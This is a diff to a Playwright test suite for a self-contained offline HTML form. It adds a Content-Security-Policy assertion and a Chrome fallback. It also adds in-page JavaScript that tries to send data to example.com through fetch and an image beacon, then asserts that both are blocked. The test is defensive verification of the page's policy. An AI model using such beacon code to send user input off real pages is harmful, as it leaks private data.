@@ -109,6 +109,7 @@ def test_form_is_self_contained_and_offline(tmp_path):
     assert "ERS-LOG-01" in html and "/*BANK_JSON*/" not in html
     assert not re.search(r'<(script|link|img)[^>]+(src|href)="https?://', html)
     assert "fetch(" not in html and "XMLHttpRequest" not in html
+    assert "Content-Security-Policy" in html and "default-src 'none'" in html
     payload = html.split('id="bank-data">', 1)[1].split("</script>", 1)[0]
     assert json.loads(payload)["bank"] == "opcp-exit-readiness"
 
@@ -120,8 +121,11 @@ def test_form_round_trip_in_a_browser(tmp_path):
     with sync_api.sync_playwright() as p:
         try:
             browser = p.chromium.launch()
-        except Exception:  # browser binaries not installed
-            pytest.skip("Chromium not available")
+        except Exception:  # Playwright's own Chromium not installed: try an installed Chrome
+            try:
+                browser = p.chromium.launch(channel="chrome")
+            except Exception:
+                pytest.skip("Chromium not available")
         page = browser.new_context(accept_downloads=True).new_page()
         page.goto(path.as_uri())
         page.fill("#org", "Round Trip Bank")
@@ -139,6 +143,13 @@ def test_form_round_trip_in_a_browser(tmp_path):
             page.click("#dl")
         out = tmp_path / "answers.json"
         d.value.save_as(out)
+        # The page's security policy stops anything typed from leaving the device, even if a script were
+        # injected: requests and image beacons to another site are blocked by the browser.
+        sent = page.evaluate("""async () => { try { await fetch('https://example.com/?d=1'); return 'sent'; }
+                                              catch (e) { return 'blocked'; } }""")
+        beacon = page.evaluate("""() => new Promise(r => { const i = new Image(); i.onload = () => r('loaded');
+                                  i.onerror = () => r('blocked'); i.src = 'https://example.com/p.gif?d=1'; })""")
+        assert (sent, beacon) == ("blocked", "blocked")
         browser.close()
     from opcp.scorecard import evaluate_file
     result = evaluate_file(out)
